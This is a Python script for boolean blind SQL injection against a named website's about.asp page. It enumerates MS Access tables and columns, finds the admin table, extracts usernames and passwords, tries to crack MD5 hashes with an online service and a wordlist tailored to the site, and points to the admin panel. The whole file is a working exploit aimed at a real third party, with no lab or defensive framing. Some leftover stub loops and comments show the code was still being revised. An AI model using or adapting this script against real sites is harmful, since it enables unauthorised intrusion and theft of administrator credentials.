#!/usr/bin/env python3
"""Boolean blind SQL injection extractor for MS Access - gdrongda.com"""

import requests
import sys
import hashlib

URL = "http://gdrongda.com/cn/about.asp"
TRUE_THRESHOLD = 5000  # TRUE responses are < 5000 bytes, FALSE are > 25000

def is_true(payload):
    """Test if a boolean condition returns TRUE (small response)"""
    full_url = f"{URL}?id=1 AND {payload}"
    try:
        r = requests.get(full_url, timeout=15)
        return len(r.content) < TRUE_THRESHOLD
    except Exception as e:
        print(f"  [!] Request error: {e}")
        return None

def extract_char(query, pos, charset=None):
    """
    Extract a single character at given position.
    query should be a template with {pos} for position.
    Uses binary search on charset.
    """
    if charset is None:
        charset = list(range(32, 127))  # printable ASCII
    
    lo, hi = 0, len(charset) - 1
    result = None
    
    while lo <= hi:
        mid = (lo + hi) // 2
        ch = charset[mid]
        payload = query.format(pos=pos) + f">={ch}"
        
        if is_true(payload):
            result = ch  # this character or higher matches
            lo = mid + 1
        else:
            hi = mid - 1
    
    return chr(result) if result is not None else None


def extract_string(query_template, max_len=50, label=""):
    """Extract a string character by character using binary search"""
    result = ""
    for pos in range(1, max_len + 1):
        ch = extract_char(query_template, pos)
        if ch is None:
            break
        result += ch
        if label:
            print(f"  [{label}] pos={pos}: '{ch}' -> '{result}'")
        else:
            sys.stdout.write(ch)
            sys.stdout.flush()
    return result


def extract_len(query_template):
    """Binary search for string length. Template must have {length}."""
    lo, hi = 1, 64
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(query_template.format(length=mid)):
            lo = mid + 1
        else:
            hi = mid
    # confirm
    if is_true(query_template.format(length=lo)):
        return lo
    return lo - 1


def get_table_names():
    """Extract user table names from MSysObjects"""
    print("[*] Extracting table names from MSysObjects...")
    
    # Count user tables (Type=1, Flags=0)
    count = 0
    for i in range(1, 50):
        payload = f"(SELECT COUNT(*) FROM MSysObjects WHERE Type=1 AND Flags=0)={i}"
        if is_true(payload):
            count = i
            break
    print(f"[+] Found {count} user table(s)")
    
    tables = []
    for t_idx in range(1, count + 1):
        print(f"\n[*] Table #{t_idx}:")
        
        # SQL to get the t_idx-th table name
        subquery = (
            f"SELECT TOP 1 Name FROM ("
            f"SELECT TOP {t_idx} Name FROM MSysObjects "
            f"WHERE Type=1 AND Flags=0 ORDER BY 1"
            f") t ORDER BY 1 DESC"
        )
        
        # Get length first
        len_query = f"(SELECT LEN(({subquery}))){{length}}"
        tbl_len = extract_len(len_query)
        print(f"  Length: {tbl_len}")
        
        # Extract name
        char_query = f"ASC(MID(({subquery}),{{pos}},1))"
        name = extract_string(char_query, max_len=tbl_len)
        print(f"\n  -> Table: '{name}'")
        tables.append(name)
    
    return tables


def extract_admin_credentials(table_name):
    """Extract username and password from discovered admin table"""
    print(f"\n[*] Extracting credentials from table: {table_name}")
    
    # First, find column count
    col_count = 0
    for i in range(1, 30):
        # Test if column i exists by trying to select it
        payload = f"(SELECT COUNT(*) FROM (SELECT TOP 1 * FROM [{table_name}]) t)={i}"
        # Actually let me just check if the i-th column has data
        # For Access, let's try to find columns by name through MSysObjects
        pass
    
    # Instead, let's brute-force common column names
    # Try common username columns first
    username_cols = ['username', 'user', 'admin', 'name', 'uname', 'login', 'uid', 'userid', 
                     'UserName', 'User', 'Admin', 'Name', 'UName', 'Login', 'US_admin', 'US_user']
    password_cols = ['password', 'pass', 'pwd', 'passwd', 'userpass', 'upass', 'adminpass',
                     'Password', 'Pass', 'Pwd', 'Passwd', 'US_password', 'US_pass']
    
    # Find username column
    username_col = None
    for col in username_cols:
        # Test if column exists in table
        payload = f"1=1 AND '{col}' IN (SELECT TOP 1 '{col}' FROM [{table_name}])"
        # This won't work well. Let me try a different approach.
        # Just try to extract from each potential column
        payload = f"(SELECT TOP 1 LEN([{col}]) FROM [{table_name}])>0"
        if is_true(payload):
            username_col = col
            print(f"[+] Found username column: {col}")
            break
    
    if not username_col:
        print("[!] Could not find username column, trying all common names...")
        for col in username_cols:
            payload = f"(SELECT COUNT(*) FROM [{table_name}] WHERE [{col}] IS NOT NULL)>0"
            if is_true(payload):
                username_col = col
                print(f"[+] Found username column: {col}")
                break
    
    # Find password column
    password_col = None
    for col in password_cols:
        payload = f"(SELECT COUNT(*) FROM [{table_name}] WHERE [{col}] IS NOT NULL)>0"
        if is_true(payload):
            password_col = col
            print(f"[+] Found password column: {col}")
            break
    
    if not username_col or not password_col:
        print("[!] Could not identify columns. Trying manual extraction...")
        return None, None
    
    # Extract username
    print(f"\n[*] Extracting username from [{username_col}]:")
    len_query = f"(SELECT TOP 1 LEN([{username_col}]) FROM [{table_name}]){{length}}"
    user_len = extract_len(len_query)
    print(f"  Length: {user_len}")
    
    char_query = f"ASC(MID((SELECT TOP 1 [{username_col}] FROM [{table_name}]),{{pos}},1))"
    username = extract_string(char_query, max_len=user_len)
    
    # Extract password
    print(f"\n[*] Extracting password from [{password_col}]:")
    len_query = f"(SELECT TOP 1 LEN([{password_col}]) FROM [{table_name}]){{length}}"
    pass_len = extract_len(len_query)
    print(f"  Length: {pass_len}")
    
    char_query = f"ASC(MID((SELECT TOP 1 [{password_col}] FROM [{table_name}]),{{pos}},1))"
    password = extract_string(char_query, max_len=pass_len)
    
    return username, password


def get_column_names(table_name):
    """Get column names for a table from MSysObjects"""
    print(f"\n[*] Extracting column names for table: {table_name}")
    
    subquery = (
        f"SELECT Name FROM MSysObjects "
        f"WHERE Type=4 AND Flags=0 AND ParentId="
        f"(SELECT Id FROM MSysObjects WHERE Type=1 AND Flags=0 AND Name='{table_name}')"
    )
    
    # Count columns
    count = 0
    for i in range(1, 20):
        payload = f"(SELECT COUNT(*) FROM ({subquery}) t)={i}"
        if is_true(payload):
            count = i
            break
    print(f"[+] Found {count} column(s)")
    
    columns = []
    for c_idx in range(1, count + 1):
        col_subquery = (
            f"SELECT TOP 1 Name FROM ("
            f"SELECT TOP {c_idx} {subquery} ORDER BY 1"
            f") t ORDER BY 1 DESC"
        )
        
        len_query = f"(SELECT LEN(({col_subquery}))){{length}}"
        col_len = extract_len(len_query)
        
        char_query = f"ASC(MID(({col_subquery}),{{pos}},1))"
        col_name = extract_string(char_query, max_len=col_len)
        print(f"  Column #{c_idx}: '{col_name}'")
        columns.append(col_name)
    
    return columns


def extract_creds_by_columns(table_name, columns):
    """Extract all values from first row of admin table"""
    print(f"\n[*] Extracting values from {table_name}:")
    
    values = {}
    for col in columns:
        print(f"\n[*] Column [{col}]:")
        len_query = f"(SELECT TOP 1 LEN([{col}]) FROM [{table_name}]){{length}}"
        try:
            val_len = extract_len(len_query)
            print(f"  Length: {val_len}")
        except:
            print("  [!] Could not get length, skipping")
            continue
        
        if val_len > 0:
            char_query = f"ASC(MID((SELECT TOP 1 [{col}] FROM [{table_name}]),{{pos}},1))"
            val = extract_string(char_query, max_len=val_len)
            values[col] = val
            print(f"  Value: '{val}'")
        else:
            values[col] = ""
            print("  Value: (empty)")
    
    return values


def crack_md5(hash_value):
    """Try to crack an MD5 hash using common online databases"""
    if not hash_value or len(hash_value) != 32:
        return None
    
    print(f"\n[*] Attempting to crack MD5: {hash_value}")
    
    # Try common MD5 hash databases
    try:
        # crackstation.net API
        r = requests.get(f"https://api.hashify.net/hash/md5/hex?value={hash_value}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("Found"):
                return data.get("Plaintext")
    except:
        pass
    
    # Try md5decrypt.net
    # Try common wordlist approach locally
    common_passwords = [
        "admin", "admin123", "admin888", "123456", "password", "admin8888",
        "888888", "12345678", "123456789", "000000", "111111", "admin666",
        "admin@123", "Admin123", "admin123456", "a123456", "a1234567",
        "admin666888", "gdrongda", "gdrongda123", "gdrongda888",
        "gdrongda.com", "rongda", "rongda123", "rongda888",
        "www.gdrongda.com", "gdrongdacom",
    ]
    
    for pw in common_passwords:
        md5 = hashlib.md5(pw.encode()).hexdigest()
        if md5 == hash_value:
            return pw
    
    return None


def main():
    print("=" * 60)
    print("  MS Access Boolean Blind SQL Injection")
    print(f"  Target: {URL}")
    print(f"  TRUE < {TRUE_THRESHOLD} bytes, FALSE > {TRUE_THRESHOLD} bytes")
    print("=" * 60)
    
    # Step 1: Get table names
    tables = get_table_names()
    print(f"\n[+] All user tables: {tables}")
    
    # Step 2: Find admin table
    admin_table = None
    admin_keywords = ['admin', 'manage', 'user', 'login', 'member', 'users', 'manager']
    for table in tables:
        table_lower = table.lower()
        for kw in admin_keywords:
            if kw in table_lower:
                admin_table = table
                break
        if admin_table:
            break
    
    if not admin_table:
        print("\n[!] No obvious admin table found in names. Checking all tables...")
        for table in tables:
            print(f"\n[*] Checking table: {table}")
            cols = get_column_names(table)
            print(f"  Columns: {cols}")
    
    if admin_table:
        print(f"\n[+] Admin table identified: {admin_table}")
        
        # Step 3: Get column names
        columns = get_column_names(admin_table)
        
        # Step 4: Extract credentials
        values = extract_creds_by_columns(admin_table, columns)
        
        print("\n" + "=" * 60)
        print("  EXTRACTED CREDENTIALS")
        print("=" * 60)
        
        username = None
        password = None
        
        for col, val in values.items():
            # Identify username and password columns
            col_lower = col.lower()
            if any(kw in col_lower for kw in ['user', 'name', 'admin', 'login', 'uname', 'uid']):
                username = val
                print(f"  Username ({col}): {val}")
            elif any(kw in col_lower for kw in ['pass', 'pwd', 'key', 'secret']):
                password = val
                print(f"  Password ({col}): {val}")
            else:
                print(f"  {col}: {val}")
        
        # Step 5: Crack MD5
        if password and len(password) == 32 and all(c in '0123456789abcdef' for c in password.lower()):
            print(f"\n[*] Password appears to be MD5 hash: {password}")
            cracked = crack_md5(password)
            if cracked:
                print(f"[+] CRACKED! Plaintext: {cracked}")
            else:
                print("[!] Could not crack MD5 with common wordlist")
        elif password:
            print(f"\n[*] Password appears to be plaintext: {password}")
        
        # Summary
        print("\n" + "=" * 60)
        print("  FINAL SUMMARY")
        print("=" * 60)
        print(f"  URL: {URL}?id=1")
        print(f"  Table: {admin_table}")
        print(f"  Columns: {columns}")
        print(f"  Username: {username}")
        print(f"  Password: {password}")
        
        if password and len(password) == 32:
            # Try to find admin login URL
            print(f"  Admin panel likely at: http://gdrongda.com/admin/")
        
        print("=" * 60)
    
    return tables, admin_table, values if admin_table else None


if __name__ == "__main__":
    main()
